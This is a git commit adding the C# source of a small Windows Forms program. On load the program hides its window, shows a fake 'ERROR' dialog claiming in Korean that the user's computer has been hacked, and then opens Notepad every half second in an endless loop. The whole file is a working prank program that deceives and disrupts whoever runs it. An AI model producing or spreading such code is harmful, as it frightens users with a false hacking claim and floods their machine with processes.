178c37fc5815a4b9314df3361a1522bcd2ed4f6b
시혁 박 <exon.indiv@gmail.com>
2020-09-09 12:56:26 +0900

    init

---
+++ WindowsFormsApp1/WindowsFormsApp1/Form1.cs
@@ -0,0 +1,33 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Diagnostics;
+using System.Threading;
+
+namespace WindowsFormsApp1
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            this.Hide();
+            MessageBox.Show("헤헿 니컴 해킹 ㅅㄱ", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            while (true)
+            {
+                Process.Start("notepad.exe");
+                Thread.Sleep(500);
+            }
+        }
+    }
+}
